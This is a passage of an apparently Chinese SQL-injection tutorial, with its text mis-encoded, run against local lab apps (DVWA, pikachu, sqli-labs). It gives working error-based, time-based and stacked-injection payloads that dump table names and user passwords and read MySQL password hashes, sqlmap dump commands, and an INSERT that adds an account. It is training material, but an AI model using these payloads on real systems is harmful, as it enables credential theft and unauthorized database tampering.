class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure></li><li><p><code>geometrycollection()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multipoint()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>polygon()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multipolygon()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>linestring()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multilinestring()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>exp()</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure></li></ol><h2 id="1-7-4-åœ¨é»‘ç›’æ¨¡å¼ä¸‹çš„æŠ¥é”™æ³¨å…¥"><a href="#1-7-4-åœ¨é»‘ç›’æ¨¡å¼ä¸‹çš„æŠ¥é”™æ³¨å…¥" class="headerlink" title="1.7.4 åœ¨é»‘ç›’æ¨¡å¼ä¸‹çš„æŠ¥é”™æ³¨å…¥"></a>1.7.4 åœ¨é»‘ç›’æ¨¡å¼ä¸‹çš„æŠ¥é”™æ³¨å…¥</h2><p>åœ¨é»‘ç›’æ¨¡å¼ä¸‹çš„æŠ¥é”™æ³¨å…¥ï¼Œé¦–å…ˆè·å–å½“å‰åº“ï¼Œé€šè¿‡åº“è·å–è¡¨åï¼Œæ¥ç€é€šè¿‡è¡¨åè·å–å­—æ®µï¼Œæœ€åè·å–å­—æ®µå†…å®¹ã€‚</p><h3 id="1-7-5-æŠ¥é”™æ³¨å…¥å¾—åˆ°åº“å"><a href="#1-7-5-æŠ¥é”™æ³¨å…¥å¾—åˆ°åº“å" class="headerlink" title="1.7.5 æŠ¥é”™æ³¨å…¥å¾—åˆ°åº“å"></a>1.7.5 æŠ¥é”™æ³¨å…¥å¾—åˆ°åº“å</h3><p>æ³¨å…¥ä»¥åè¯­å¥å‡å¯è·å–åº“åï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and info()--</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°åº“å <code>dvwa</code>ã€‚</p><h3 id="1-7-6æŠ¥é”™æ³¨å…¥è·å–-MySQL-è´¦å·å’Œå¯†ç "><a href="#1-7-6æŠ¥é”™æ³¨å…¥è·å–-MySQL-è´¦å·å’Œå¯†ç " class="headerlink" title="1.7.6æŠ¥é”™æ³¨å…¥è·å– MySQL è´¦å·å’Œå¯†ç "></a>1.7.6æŠ¥é”™æ³¨å…¥è·å– MySQL è´¦å·å’Œå¯†ç </h3><p>è·å–è´¦å·å’Œå¯†ç éœ€è¦ root ç”¨æˆ·æ‰æœ‰è¶³å¤Ÿå¤§çš„æƒé™ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span> )),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br><span class="line"><span class="keyword">select</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="built_in">substring</span>((<span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span>),<span class="number">32</span>,<span class="number">40</span>))),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="1-7-7æŠ¥é”™æ³¨å…¥è·å–è¡¨å"><a href="#1-7-7æŠ¥é”™æ³¨å…¥è·å–è¡¨å" class="headerlink" title="1.7.7æŠ¥é”™æ³¨å…¥è·å–è¡¨å"></a>1.7.7æŠ¥é”™æ³¨å…¥è·å–è¡¨å</h3><p>é€šè¿‡ MySQL å†…ç½®åº“ <code>information_schema</code>ï¼Œé€šè¿‡æ„é€  SQL è¯­å¥æŸ¥è¯¢è·å–è¡¨åã€‚é‡‡ç”¨ <code>floor</code> æŠ¥é”™å¹¶ä¸ä¼šå­˜åœ¨é•¿åº¦é—®é¢˜ã€‚</p><p>æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¡¨åï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><p>å°† <code>LIMIT 0,1</code> æ”¹æˆ <code>1,1</code>ï¼Œè¡¨æ˜¯ç¬¬äºŒä¸ªè¡¨åï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><h3 id="1-7-8-æŠ¥é”™æ³¨å…¥è·å–å­—æ®µ"><a href="#1-7-8-æŠ¥é”™æ³¨å…¥è·å–å­—æ®µ" class="headerlink" title="1.7.8 æŠ¥é”™æ³¨å…¥è·å–å­—æ®µ"></a>1.7.8 æŠ¥é”™æ³¨å…¥è·å–å­—æ®µ</h3><p>åœ¨è·å–è¡¨åä¹‹åå°±å¯ä»¥è·å–å­—æ®µåï¼Œå¦‚è·å– <code>users</code> çš„å­—æ®µåã€‚</p><p>è·å–ç¬¬ä¸€ä¸ªå­—æ®µåï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><p>è·å–ç¬¬äºŒä¸ªå­—æ®µåï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ Burp Suite æ‰¹é‡å¯¹å­—æ®µæ‰¹é‡è·å–ï¼Œé¦–å…ˆæŠ“åŒ…ï¼Œä¿®æ”¹å˜é‡ï¼Œè®¾ç½®åŒ¹é…è§„åˆ™ã€‚å¼€å¯æ”»å‡»ã€‚</p><h3 id="1-7-9-æŠ¥é”™æ³¨å…¥è·å–æŸè¡¨æŸæ®µå†…å®¹"><a href="#1-7-9-æŠ¥é”™æ³¨å…¥è·å–æŸè¡¨æŸæ®µå†…å®¹" class="headerlink" title="1.7.9 æŠ¥é”™æ³¨å…¥è·å–æŸè¡¨æŸæ®µå†…å®¹"></a>1.7.9 æŠ¥é”™æ³¨å…¥è·å–æŸè¡¨æŸæ®µå†…å®¹</h3><p>ç°åœ¨å·²ç»è·å– <code>users</code> è¡¨çš„åå­—å’Œå®ƒçš„å­—æ®µåï¼Œæ¥ä¸‹æ¥å¯ä»¥å¯¹å†…å®¹è¿›è¡ŒæŸ¥è¯¢ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨å¤šä¸ªç”¨æˆ·ï¼ŒæŠŠ <code>limit 0,1</code> æ”¹æˆ <code>1,1</code>ï¼Œå¦‚æ­¤ç±»æ¨ç›´åˆ°è·å–æœ€åä¸€ä¸ªç”¨æˆ·ä¸ºæ­¢ã€‚ä½¿ç”¨ Burpsuite å¯¹ç”¨æˆ·è·å–ï¼Œè®¾ç½®æ•°é‡ï¼Œå†è®¾ç½®è¿‡æ»¤ç½‘é¡µå“åº”å†…å®¹ã€‚</p><p>è·å–åº“é‡Œ <code>users</code> è¡¨æ‰€æœ‰ç”¨æˆ·çš„è´¦å·å’Œå¯†ç ã€‚</p><h1 id="1-8-æ—¶é—´æ³¨å…¥"><a href="#1-8-æ—¶é—´æ³¨å…¥" class="headerlink" title="1.8 æ—¶é—´æ³¨å…¥"></a>1.8 æ—¶é—´æ³¨å…¥</h1><h2 id="æ—¶é—´æ³¨å…¥"><a href="#æ—¶é—´æ³¨å…¥" class="headerlink" title="æ—¶é—´æ³¨å…¥"></a>æ—¶é—´æ³¨å…¥</h2><p>æ—¶é—´æ³¨å…¥åˆåå»¶æ—¶æ³¨å…¥ï¼Œå±äºç›²æ³¨å…¥çš„ä¸€ç§ï¼Œé€šå¸¸æ˜¯æŸä¸ªæ³¨å…¥ç‚¹æ— æ³•é€šè¿‡å¸ƒå°”å‹æ³¨å…¥è·å–æ•°æ®è€Œé‡‡ç”¨çš„ä¸€ç§çªç ´æ³¨å…¥çš„æŠ€å·§ã€‚</p><p>åœ¨ MySQL é‡Œï¼Œå‡½æ•° <code>sleep()</code> æ˜¯å»¶æ—¶çš„æ„æ€ï¼Œ<code>sleep(10)</code> å°±æ˜¯æ•°æ®åº“å»¶æ—¶ 10 ç§’è¿”å›å†…å®¹ã€‚åˆ¤æ–­æ³¨å…¥å¯ä»¥ä½¿ç”¨ <code>&#39;and sleep(10)</code>ï¼Œæ•°æ®åº“å»¶æ—¶ 10 ç§’è¿”å›å€¼ï¼Œç½‘é¡µå“åº”æ—¶é—´è‡³å°‘è¦ 10 ç§’ã€‚æ ¹æ®è¿™ä¸ªåŸç†æ¥åˆ¤æ–­å­˜åœ¨ SQL æ—¶é—´æ³¨å…¥ã€‚</p><p>MySQL å»¶æ—¶æ³¨å…¥ç”¨åˆ°çš„å‡½æ•°æœ‰ <code>sleep()</code>ã€<code>if()</code>ã€<code>substring()</code>ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span>, SLEEP(<span class="number">10</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><code>2&gt;1</code> è¿™ä¸ªéƒ¨åˆ†å°±æ˜¯ä½ æ³¨å…¥è¦æ„é€ çš„ SQL è¯­å¥ã€‚å¦‚æœæ¡ä»¶æˆç«‹ï¼Œå°±ä¼šè§¦å‘å»¶æ—¶ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(LENGTH(database())<span class="operator">&gt;</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¯­å¥ç”¨äºæŸ¥è¯¢å½“å‰åº“åé•¿åº¦æ˜¯å¦å¤§äº 1ï¼Œå¦‚æœæ˜¯ï¼Œå°±ä¼šå»¶æ—¶ 5 ç§’æ‰§è¡Œã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; OR IF(LENGTH(database())&gt;1, SLEEP(5), 0)--+</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç½‘é¡µå“åº”æ—¶é—´å¤§äºäº”ç§’ï¼Œæ ¹æ®è¿™ä¸ªåŸç†ï¼Œå¦‚æœ <code>n&gt;1</code>ï¼Œ<code>n</code> ä¸å»¶æ—¶å°±èƒ½ç¡®å®šå½“å‰æ•°æ®åº“çš„é•¿åº¦äº†ã€‚</p><p>å¦‚æœæƒ³è¦è·å–æ•°æ®å†…å®¹ï¼Œå¯ä»¥ç”¨æˆªå–å­—ç¬¦å†è¿›è¡Œå­—ç¬¦å¯¹æ¯”ï¼Œå¦‚æœç›¸åŒå°±è¿›è¡Œå»¶æ—¶ã€‚è¿™æ ·å°±èƒ½é€ä¸ªè·å–å­—ç¬¦ï¼Œæ¥ç€å†æ‹¼æ¥å°±æ˜¯å½“å‰åº“çš„å†…å®¹ã€‚</p><p><strong>æ³¨æ„</strong>ï¼šç”±äºç½‘ç»œåŸå› ï¼Œæˆ‘æ— æ³•æˆåŠŸè§£æä»¥ä¸‹é“¾æ¥ã€‚å¦‚æœéœ€è¦è¯¥ç½‘é¡µçš„å…·ä½“å†…å®¹ï¼Œè¯·æ£€æŸ¥é“¾æ¥çš„åˆæ³•æ€§ï¼Œå¹¶é€‚å½“é‡è¯•ã€‚</p><ul><li><a href="http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name&#x3D;1&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2</a></li></ul><hr><h2 id="1-19-2-æ—¶é—´æ³¨å…¥ä»£ç åˆ†æ"><a href="#1-19-2-æ—¶é—´æ³¨å…¥ä»£ç åˆ†æ" class="headerlink" title="1.19.2 æ—¶é—´æ³¨å…¥ä»£ç åˆ†æ"></a>1.19.2 æ—¶é—´æ³¨å…¥ä»£ç åˆ†æ</h2><p>åœ¨é¡µé¢ä¸­åˆ†ææºç ï¼Œç›´æ¥è·å– <code>name</code> å¸¦è¿›æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ï¼Œä½†æ˜¯å¦å­˜åœ¨è®°å½•ï¼Œé¡µé¢è¿”å›éƒ½ä¸€æ ·ã€‚åœ¨é»‘ç›’æ¨¡å¼ä¸‹å¯ä»¥ä½¿ç”¨ sqlmap å¯¹æ³¨å…¥è¿›è¡Œæ£€æµ‹ã€‚sqlmap æ”¯æŒå¤šç§æ•°æ®åº“æ³¨å…¥ï¼Œè€Œä¸”æ”¯æŒå¤šç§æ³¨å…¥æ–¹å¼ã€‚</p><h3 id="é‡‡ç”¨æ—¶é—´æ³¨å…¥"><a href="#é‡‡ç”¨æ—¶é—´æ³¨å…¥" class="headerlink" title="é‡‡ç”¨æ—¶é—´æ³¨å…¥"></a>é‡‡ç”¨æ—¶é—´æ³¨å…¥</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T</span><br></pre></td></tr></table></figure><ul><li><code>-u</code>ï¼šè¡¨ç¤ºæ£€æµ‹çš„ URLã€‚</li><li><code>-p</code>ï¼šæŒ‡å®šæ£€æµ‹çš„å‚æ•°ã€‚</li><li><code>-v</code>ï¼šæ˜¾ç¤ºè°ƒè¯•æ¨¡å¼ã€‚</li><li><code>--technique=T</code>ï¼šæ£€æµ‹æ–¹æ³•ä¸ºæ—¶é—´æ³¨å…¥ã€‚</li></ul><p>sqlmap æ£€æµ‹ä¸ºæ—¶é—´æ³¨å…¥åï¼Œæ¥ä¸‹æ¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ³¨å…¥è·å–æ•°æ®åº“çš„åã€ç”¨æˆ·æƒé™ã€è¡¨ã€å­—æ®µç­‰æ•æ„Ÿä¿¡æ¯çš„è·å–ã€‚</p><h3 id="è·å–æ•°æ®åº“ä¿¡æ¯"><a href="#è·å–æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="è·å–æ•°æ®åº“ä¿¡æ¯"></a>è·å–æ•°æ®åº“ä¿¡æ¯</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --current-user --current-db --batch</span><br></pre></td></tr></table></figure><ul><li><code>--current-user</code>ï¼šè·å–å½“å‰ç”¨æˆ·ã€‚</li><li><code>--current-db</code>ï¼šè·å–å½“å‰æ•°æ®åº“ã€‚</li><li><code>--batch</code>ï¼šä½¿ç”¨é»˜è®¤æ¨¡å¼ï¼Œè‡ªåŠ¨å›ç­” <code>y</code>ã€‚</li></ul><h3 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a>è·å–è¡¨å</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --tables -D pikachu --batch</span><br></pre></td></tr></table></figure><ul><li><code>-D</code>ï¼šæŒ‡å®šæ•°æ®åº“ã€‚</li><li><code>--tables</code>ï¼šè·å–è¡¨åã€‚</li></ul><h3 id="è·å–å­—æ®µå"><a href="#è·å–å­—æ®µå" class="headerlink" title="è·å–å­—æ®µå"></a>è·å–å­—æ®µå</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --columns -T <span class="built_in">users</span> -D pikachu --batch</span><br></pre></td></tr></table></figure><ul><li><code>-T</code>ï¼šæŒ‡å®šè¡¨åã€‚</li><li><code>--columns</code>ï¼šè·å–å­—æ®µåã€‚</li></ul><h3 id="æŸ¥è¯¢è´¦å·å’Œå¯†ç "><a href="#æŸ¥è¯¢è´¦å·å’Œå¯†ç " class="headerlink" title="æŸ¥è¯¢è´¦å·å’Œå¯†ç "></a>æŸ¥è¯¢è´¦å·å’Œå¯†ç </h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --dump -C <span class="string">&quot;id,username,password&quot;</span> -T <span class="built_in">users</span> -D pikachu --batch</span><br></pre></td></tr></table></figure><ul><li><code>--dump</code>ï¼šå¯¼å‡ºæ•°æ®ã€‚</li><li><code>-C</code>ï¼šæŒ‡å®šæŸ¥è¯¢çš„å­—æ®µã€‚</li></ul><p>ä½¿ç”¨ sqlmap å¯ä»¥å¾ˆå®¹æ˜“åœ°å°†æ—¶é—´æ³¨å…¥çš„æ•°æ®æŸ¥è¯¢å‡ºæ¥ã€‚</p><h1 id="1-9-å †å æ³¨å…¥"><a href="#1-9-å †å æ³¨å…¥" class="headerlink" title="1.9 å †å æ³¨å…¥"></a>1.9 å †å æ³¨å…¥</h1><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>å †å æŸ¥è¯¢ï¼šå †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡ SQL è¯­å¥ï¼Œè¯­å¥ä¹‹é—´ä»¥åˆ†å·ï¼ˆ<code>;</code>ï¼‰éš”å¼€ï¼Œè€Œå †å æŸ¥è¯¢æ³¨å…¥æ”»å‡»å°±æ˜¯åˆ©ç”¨æ­¤ç‰¹ç‚¹ï¼Œåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­æ„é€ è¦æ‰§è¡Œæ”»å‡»çš„è¯­å¥ã€‚</p><p>åœ¨ MySQL é‡Œï¼Œ<code>mysqli_multi_query</code> å’Œ <code>mysql_multi_query</code> è¿™ä¸¤ä¸ªå‡½æ•°æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚å¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> version(); <span class="keyword">SELECT</span> database()</span><br></pre></td></tr></table></figure><p>å †å æ³¨å…¥çš„å±å®³æ˜¯å¾ˆå¤§çš„ï¼Œå¯ä»¥ä»»æ„ä½¿ç”¨å¢åˆ æ”¹æŸ¥çš„è¯­å¥ï¼Œä¾‹å¦‚åˆ é™¤æ•°æ®åº“ã€ä¿®æ”¹æ•°æ®åº“ã€æ·»åŠ æ•°æ®åº“ç”¨æˆ·ã€‚</p><h2 id="1-19-4-å †å æ³¨å…¥ä»£ç åˆ†æ"><a href="#1-19-4-å †å æ³¨å…¥ä»£ç åˆ†æ" class="headerlink" title="1.19.4 å †å æ³¨å…¥ä»£ç åˆ†æ"></a>1.19.4 å †å æ³¨å…¥ä»£ç åˆ†æ</h2><p>é¶åœºå¯åŠ¨ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -dt --name sqli -p 7766:80 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure><p>åœ¨å †å æ³¨å…¥é¡µé¢ä¸­ï¼Œç¨‹åºè·å– <code>GET</code> å‚æ•°çš„ <code>id</code>ï¼Œä½¿ç”¨ <code>mysqli</code> çš„æ–¹å¼è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œåœ¨æ‰§è¡Œè¯­å¥æ—¶ä½¿ç”¨äº† <code>mysqli_multi_query</code> å‡½æ•°å¤„ç† SQL è¯­å¥ï¼Œå¯¼è‡´å­˜åœ¨å †å æ³¨å…¥ã€‚</p><p>è¿›å…¥ Docker å®¹å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -ti sqli /bin/bash</span><br></pre></td></tr></table></figure><h2 id="1-9-5-å †å æ³¨å…¥çš„åˆ©ç”¨"><a href="#1-9-5-å †å æ³¨å…¥çš„åˆ©ç”¨" class="headerlink" title="1.9.5 å †å æ³¨å…¥çš„åˆ©ç”¨"></a>1.9.5 å †å æ³¨å…¥çš„åˆ©ç”¨</h2><p>ä½¿ç”¨ä»¥ä¸‹è¯­å¥å…ˆç¡®å®šæ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND 1=2--+ </span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>æ¥ç€ä½¿ç”¨å †å è¯­æ³•è¿›è¡Œæ£€æµ‹ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-999</span><span class="string">&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1)--+</span></span><br></pre></td></tr></table></figure><p>æŠŠåº“é‡Œçš„æ‰€æœ‰è¡¨è·å–å‡ºæ¥ï¼Œå†è·å–å­—æ®µï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-999</span><span class="string">&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME=&#x27;</span>users<span class="string">&#x27; LIMIT 1)--+</span></span><br></pre></td></tr></table></figure><p>çŸ¥é“è¡¨çš„åˆ—çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨ <code>INSERT INTO</code> æ’å…¥è¯­å¥è¿›è¡Œå¢åŠ è´¦å·ã€‚å¦‚æœæ˜¯ç®¡ç†è¡¨ï¼Œç›´æ¥æ·»åŠ ç®¡ç†å‘˜è´¦å·å³å¯ç™»å½•åå°ã€‚</p><p>ç”±äºç½‘ç»œåŸå› ï¼Œæˆ‘æ— æ³•æˆåŠŸè§£æä»¥ä¸‹é“¾æ¥ã€‚å¦‚æœéœ€è¦è¯¥ç½‘é¡µçš„å…·ä½“å†…å®¹ï¼Œè¯·æ£€æŸ¥é“¾æ¥çš„åˆæ³•æ€§ï¼Œå¹¶é€‚å½“é‡è¯•ã€‚</p><ul><li><a href="http://192.168.0.145:7766/Less-38/?id=1%27">http://192.168.0.145:7766/Less-38/?id=1%27</a></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-999</span><span class="string">&#x27;; INSERT INTO users(id,username,password) VALUES(1000,&#x27;</span>moonsec<span class="string">&#x27;,&#x27;</span><span class="number">123456</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure><p>è®¿é—® <code>1000</code> å³å¯è®¿é—®åˆ°åˆšåˆšæ·»åŠ çš„è´¦å·ã€‚</p><h1 id="1-10-äºŒæ¬¡æ³¨å…¥"><a href="#1-10-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="1.10 äºŒæ¬¡æ³¨å…¥"></a>1.10 äºŒæ¬¡æ³¨å…¥</h1><h2 id="äºŒæ¬¡æ³¨å…¥æ”»å‡»"><a href="#äºŒæ¬¡æ³¨å…¥æ”»å‡»" class="headerlink" title="äºŒæ¬¡æ³¨å…¥æ”»å‡»"></a>äºŒæ¬¡æ³¨å…¥æ”»å‡»</h2><p>äºŒæ¬¡æ³¨å…¥æ¼æ´æ˜¯ä¸€ç§åœ¨ Web 